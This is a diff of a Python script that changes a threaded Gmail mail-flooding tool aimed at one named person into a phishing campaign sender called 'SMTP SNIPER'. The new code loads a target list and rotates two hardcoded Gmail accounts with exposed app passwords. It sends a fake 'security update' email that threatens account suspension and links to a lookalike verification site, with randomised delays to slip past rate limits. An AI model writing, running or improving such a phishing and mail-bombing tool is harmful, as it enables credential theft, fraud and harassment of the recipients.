@@ -2,180 +2,227 @@
 import smtplib
 import time
 import random
-import threading
+import os
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ========== CONFIG ==========
 SENDERS = [
     {
         "email": "tskforcests@gmail.com",
-        "password": "zbdh eovg eosl ittv",
-        "limit": 100,
-        "sent": 0
+        "password": "zbdh eovg eosl ittv"
     },
     {
         "email": "stsvxpmain@gmail.com",
-        "password": "wkhq qgxy kqau idyu",
-        "limit": 100,
-        "sent": 0
+        "password": "wkhq qgxy kqau idyu"
     }
 ]
 
-TARGET_EMAIL = "legenza.emilia@web.de"  # CHANGE THIS
-SUBJECT = "CUSTOM2x-#1 V2 TEST"
-MESSAGE = "msg-1x ratio"
+# PHISHING TEMPLATE
+SUBJECT = "IMPORTANT UPDATE"
+MESSAGE = """Dear User,
 
-TOTAL_LIMIT = 200                    # 100 per sender = 200 total
-WAVE_SIZE = 50
-DELAY_BETWEEN_EMAILS = 0.0005
-DELAY_BETWEEN_WAVES_MIN = 120
-DELAY_BETWEEN_WAVES_MAX = 180
-MAX_WORKERS = 8
+A new security update is required for your account to maintain access.
+
+Please complete the verification process immediately:
+http://update-private-conn.vercel.app
+
+Failure to update within 24 hours may result in temporary account suspension.
+
+Best regards,
+Security Team"""
+
+DELAY_MIN = 15  # Reduced from 30
+DELAY_MAX = 45  # Reduced from 90
+
+TARGETS_FILE = "targz.txt"
+LOG_FILE = "sniper_log.txt"
 # ============================
 
-def clear_terminal():
-    print("\033[H\033[J", end="")
+def load_targets():
+    """Load targets from file"""
+    if not os.path.exists(TARGETS_FILE):
+        print(f"[!] File not found: {TARGETS_FILE}")
+        print(f"[+] Creating sample file with test targets...")
+        with open(TARGETS_FILE, "w") as f:
+            for i in range(1, 11):
+                f.write(f"target{i}@example.com\n")
+        return [f"target{i}@example.com" for i in range(1, 11)]
+    
+    with open(TARGETS_FILE, "r") as f:
+        targets = [line.strip() for line in f if line.strip()]
+    
+    return targets
+
+def log_action(message):
+    """Log to file and print"""
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    print(f"[+] SK1-SSMTØS | [{timestamp}]")
-    print("-" * 50)
+    log_entry = f"[{timestamp}] {message}"
+    
+    with open(LOG_FILE, "a") as f:
+        f.write(log_entry + "\n")
+    
+    print(log_entry)
+    return log_entry
 
-def get_active_sender():
-    """Get next sender that hasn't reached its limit"""
-    for sender in SENDERS:
-        if sender["sent"] < sender["limit"]:
-            return sender
-    return None
-
-def send_single(sender_email, sender_password):
-    """Send one email using specified sender"""
+def send_email(sender_email, sender_password, target_email):
+    """Send one email"""
     try:
-        server = smtplib.SMTP("smtp.gmail.com", 587, timeout=15)
+        server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
         server.starttls()
         server.login(sender_email, sender_password)
+        
         msg = f"Subject: {SUBJECT}\n\n{MESSAGE}"
-        server.sendmail(sender_email, TARGET_EMAIL, msg)
+        server.sendmail(sender_email, target_email, msg)
         server.quit()
+        
         return True
-    except:
+    except Exception as e:
+        log_action(f"[ERROR] Failed to {target_email}: {str(e)[:50]}")
         return False
 
-def execute_wave(wave_num):
-    """Execute one wave, rotating senders"""
-    successful = 0
-    wave_emails = 0
-    
-    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-        futures = []
-        
-        # Prepare emails for this wave
-        while wave_emails < WAVE_SIZE:
-            sender = get_active_sender()
-            if not sender:
-                break  # All senders reached limit
-            
-            # Submit email with this sender
-            future = executor.submit(send_single, sender["email"], sender["password"])
-            futures.append((future, sender))
-            wave_emails += 1
-            
-            # Tiny delay between starting threads
-            if wave_emails < WAVE_SIZE:
-                time.sleep(DELAY_BETWEEN_EMAILS)
-        
-        # Collect results and update sender counts
-        for future, sender in futures:
-            if future.result():
-                successful += 1
-                sender["sent"] += 1
-    
-    return successful, wave_emails
-
 def main():
-    clear_terminal()
+    print("\n" + "="*60)
+    print("[+] SMTP SNIPER - SECURITY UPDATE CAMPAIGN")
+    print("="*60)
     
-    total_sent = 0
-    total_successful = 0
-    wave_count = 0
+    # Load targets
+    targets = load_targets()
+    total_targets = len(targets)
     
-    # Initialize sender stats
-    for sender in SENDERS:
-        sender["sent"] = 0
+    print(f"[+] Targets loaded: {total_targets}")
+    print(f"[+] Senders ready: {len(SENDERS)}")
+    print(f"[+] Delay range: {DELAY_MIN}-{DELAY_MAX}s (FAST MODE)")
+    print(f"[+] Subject: {SUBJECT}")
+    print(f"[+] Link: http://update-private-conn.vercel.app")
+    print(f"[+] Log file: {LOG_FILE}")
+    print("="*60)
     
-    try:
-        while total_sent < TOTAL_LIMIT:
-            wave_count += 1
-            
-            # Update terminal
-            clear_terminal()
-            print(f"[∞] SSMTØS — [≠] {total_sent} — [+] {total_successful}")
-            
-            # Check if any sender still has capacity
-            if get_active_sender() is None:
-                break
-            
-            # Send wave
-            wave_successful, wave_emails = execute_wave(wave_count)
-            total_sent += wave_emails
-            total_successful += wave_successful
-            
-            # Update terminal
-            clear_terminal()
-            print(f"[∞] SSMTØS — [≠] {total_sent} — [+] {total_successful}")
-            
-            # Show sender stats
-            print("-" * 30)
-            for i, sender in enumerate(SENDERS, 1):
-                used = sender["sent"]
-                limit = sender["limit"]
-                percent = (used / limit * 100) if limit > 0 else 0
-                print(f"[{i}] {sender['email'][:15]}...: {used}/{limit} ({percent:.0f}%)")
-            
-            # Check if done
-            if total_sent >= TOTAL_LIMIT or get_active_sender() is None:
-                break
-            
-            # Cooldown
-            cooldown = random.randint(DELAY_BETWEEN_WAVES_MIN, DELAY_BETWEEN_WAVES_MAX)
-            remaining = cooldown
-            
-            while remaining > 0:
-                if remaining % 30 == 0 or remaining <= 5:
-                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                    mins = remaining // 60
-                    secs = remaining % 60
-                    print(f"\033[1;1H[+] SK1-SSMTØS | [{timestamp}]")
-                    print(f"\033[2;1H[∞] SSMTØS — [≠] {total_sent} — [+] {total_successful} | Next: {mins:02d}:{secs:02d}")
-                time.sleep(1)
-                remaining -= 1
+    if total_targets == 0:
+        print("[!] No targets found. Add emails to targz.txt")
+        return
+    
+    # Show warning
+    print("\n[⚠] CAMPAIGN DETAILS:")
+    print(f"   Subject: {SUBJECT}")
+    print(f"   Link: http://update-private-conn.vercel.app")
+    print(f"   Targets: {total_targets}")
+    print(f"   Estimated time: {(total_targets * (DELAY_MIN+DELAY_MAX)/2)/60:.1f} minutes")
+    
+    # Confirm start
+    confirm = input("\n[?] Type 'GO' to start: ").strip().upper()
+    if confirm != "GO":
+        print("[!] Cancelled")
+        return
+    
+    sent_count = 0
+    failed_count = 0
+    current_sender_index = 0
+    
+    start_time = datetime.now()
+    
+    print("\n" + "="*60)
+    print("[+] STARTING CAMPAIGN")
+    print("="*60)
+    
+    for i, target in enumerate(targets, 1):
+        # Get current sender (rotate)
+        sender = SENDERS[current_sender_index]
+        current_sender_index = (current_sender_index + 1) % len(SENDERS)
         
-        # Final display
-        clear_terminal()
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        print(f"[+] SK1-SSMTØS | [{timestamp}]")
-        print("-" * 50)
-        print(f"[∞] SSMTØS — [≠] {total_sent} — [+] {total_successful}")
-        print("-" * 50)
+        # Send email
+        success = send_email(sender["email"], sender["password"], target)
         
-        # Final sender stats
-        print("SENDER STATISTICS:")
-        for i, sender in enumerate(SENDERS, 1):
-            used = sender["sent"]
-            limit = sender["limit"]
-            success_rate = "N/A"
-            if used > 0:
-                success_rate = f"{total_successful/total_sent*100:.1f}%"
-            print(f"  [{i}] {sender['email']}: {used}/{limit}")
+        if success:
+            sent_count += 1
+            print(f"[✓] Email sent to ---> {target}")
+        else:
+            failed_count += 1
         
-        print("-" * 50)
-        print(f"✅ Complete | Total: {total_sent} | Successful: {total_successful}")
-        print(f"   Success Rate: {total_successful/total_sent*100:.1f}%" if total_sent > 0 else "✅ Complete")
+        # Progress update every 5 emails (more frequent)
+        if i % 5 == 0 or i == total_targets:
+            progress = (i / total_targets) * 100
+            elapsed = (datetime.now() - start_time).total_seconds()
+            emails_per_hour = (i / elapsed * 3600) if elapsed > 0 else 0
+            
+            print(f"[~] Progress: {i}/{total_targets} ({progress:.1f}%)")
+            print(f"[~] Success: {sent_count} | Failed: {failed_count}")
+            print(f"[~] Rate: {emails_per_hour:.1f} emails/hour")
         
-    except KeyboardInterrupt:
-        clear_terminal()
-        print(f"[+] SK1-SSMTØS | [STOPPED]")
-        print("-" * 50)
-        print(f"[∞] SSMTØS — [≠] {total_sent} — [+] {total_successful}")
+        # Check if last target
+        if i < total_targets:
+            delay = random.randint(DELAY_MIN, DELAY_MAX)
+            
+            # Show short countdown for small delays
+            if delay <= 30:
+                print(f"[⏱] Next in {delay}s", end="", flush=True)
+                for sec in range(delay, 0, -1):
+                    if sec % 10 == 0 or sec <= 5:
+                        print(f" {sec}", end="", flush=True)
+                    time.sleep(1)
+                print()
+            else:
+                mins = delay // 60
+                secs = delay % 60
+                if mins > 0:
+                    print(f"[⏱] Next in {mins}m {secs}s...")
+                else:
+                    print(f"[⏱] Next in {secs}s...")
+                time.sleep(delay)
+    
+    # Final statistics
+    end_time = datetime.now()
+    total_duration = (end_time - start_time).total_seconds()
+    
+    print("\n" + "="*60)
+    print("[+] CAMPAIGN COMPLETE")
+    print("="*60)
+    print(f"[+] Total targets: {total_targets}")
+    print(f"[+] Successfully sent: {sent_count}")
+    print(f"[+] Failed: {failed_count}")
+    
+    if total_targets > 0:
+        success_rate = (sent_count/total_targets*100)
+        print(f"[+] Success rate: {success_rate:.1f}%")
+        print(f"[+] Total time: {total_duration:.0f}s ({total_duration/60:.1f} minutes)")
+        print(f"[+] Average per email: {total_duration/total_targets:.1f}s")
+        print(f"[+] Average speed: {total_targets/(total_duration/3600):.1f} emails/hour")
+    
+    print(f"[+] Log saved: {LOG_FILE}")
+    print("="*60)
+    
+    # Save final log
+    log_action(f"SECURITY UPDATE CAMPAIGN: {sent_count}/{total_targets} sent")
+    log_action(f"Link used: http://update-private-conn.vercel.app")
+
+def quick_setup():
+    """Create necessary files"""
+    if not os.path.exists(TARGETS_FILE):
+        print(f"[+] Creating {TARGETS_FILE}...")
+        with open(TARGETS_FILE, "w") as f:
+            sample_targets = [
+                "test1@example.com",
+                "test2@example.com",
+                "test3@example.com"
+            ]
+            for target in sample_targets:
+                f.write(target + "\n")
+        print(f"[+] Edit {TARGETS_FILE} with your actual targets")
+    
+    # Display current template
+    print("\n" + "="*60)
+    print("[+] EMAIL TEMPLATE LOADED:")
+    print("="*60)
+    print(f"SUBJECT: {SUBJECT}")
+    print("-"*60)
+    print(MESSAGE)
+    print("="*60)
+    
+    print(f"\n[+] Configuration ready")
+    print(f"[+] Add target emails to: {TARGETS_FILE}")
+    print(f"[+] Delays: {DELAY_MIN}-{DELAY_MAX}s (Fast mode)")
 
 if __name__ == "__main__":
+    quick_setup()
+    print("\n[+] Starting Security Update Campaign...")
+    time.sleep(3)
     main()
